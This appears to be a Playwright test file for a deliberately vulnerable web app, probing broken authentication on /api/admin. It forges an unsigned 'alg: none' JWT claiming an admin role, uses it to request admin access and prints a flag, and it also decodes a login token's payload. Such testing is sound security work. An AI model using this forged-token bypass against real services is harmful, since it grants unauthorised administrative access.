import { test, expect, APIRequestContext } from '@playwright/test';

test.describe('/api/admin (Broken Authentication)', () => {
  test('GET admin access with forged unsigned JWT', async ({ request }: { request: APIRequestContext }) => {
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64');
    const payload = Buffer.from(JSON.stringify({ 
      id: 999, 
      username: 'hacker', 
      role: 'admin' 
    })).toString('base64');
    
    const fakeToken = `${header}.${payload}.`;
    
    const response = await request.get('/api/admin', {
      headers: {
        'Authorization': `Bearer ${fakeToken}`
      }
    });
    
    const data = await response.json();
    
    if (response.ok()) {
      expect(data.message).toContain('Admin access granted');
      console.log('✓ Admin bypass successful with forged JWT!');
      console.log(`  Flag: ${data.flag}`);
    }
  });

  test('GET login returns a JWT-like token that can be decoded (informational)', async ({ request }: { request: APIRequestContext }) => {
    // Use a normal login to obtain a token; avoid duplicating the SQLi-bypass coverage.
    const loginResponse = await request.post('/api/login', {
      data: {
        username: 'user1',
        password: 'password'
      }
    });

    expect([200, 401, 500]).toContain(loginResponse.status());
    const loginData = await loginResponse.json();

    if (loginData?.success && loginData?.token) {
      const parts = String(loginData.token).split('.');
      if (parts.length >= 2) {
        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
        console.log('✓ Token payload decoded:', payload);
      }
    }
  });
});
